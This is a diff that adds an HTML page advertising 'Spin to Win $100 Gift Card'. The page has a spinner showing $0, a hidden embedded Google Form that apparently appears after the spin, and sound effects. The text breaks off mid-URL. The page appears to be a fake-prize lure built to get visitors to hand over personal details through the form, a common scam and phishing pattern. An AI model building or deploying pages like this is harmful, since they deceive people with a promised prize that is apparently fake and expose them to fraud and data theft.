@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 Spin to Win $100 Gift Card</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f8f8;
+      text-align: center;
+      padding: 40px 20px;
+      margin: 0;
+    }
+
+    h1 {
+      color: #28a745;
+      font-size: 2rem;
+    }
+
+    p {
+      font-size: 1.2rem;
+      color: #444;
+      margin-top: 10px;
+    }
+
+    .spinner {
+      font-size: 3rem;
+      font-weight: bold;
+      margin: 40px auto;
+      color: #333;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    iframe {
+      width: 100%;
+      max-width: 640px;
+      height: 800px;
+      border: none;
+      margin-top: 20px;
+    }
+
+    @media screen and (max-width: 600px) {
+      .spinner {
+        font-size: 2.5rem;
+      }
+
+      iframe {
+        height: 700px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 Spin to Reveal Your Gift!</h1>
+  <p>Tap below to see how much you win…</p>
+
+  <div class="spinner" id="spinner">$0</div>
+
+  <iframe
+    id="form"
+    class="hidden"
+    src="https://docs.google.com/forms/d/e/1FAIpQLSeb84GEI-wVs28eQHqRLzVLAFtRnBeKRQNjElPVdjo3hegSbg/viewform?embedded=true"
+    frameborder="0"
+    marginheight="0"
+    marginwidth="0"
+  >
+    Loading…
+  </iframe>
+
+  <!-- Sound Effects -->
+  <audio id="spinSound" src="https://cdn.pixabay.com/audio/2022/03/15/audio_3453621a4d.mp3" preload="auto"></audio>
+  <audio id="winSound" src="https://cdn.pixabay.com/au
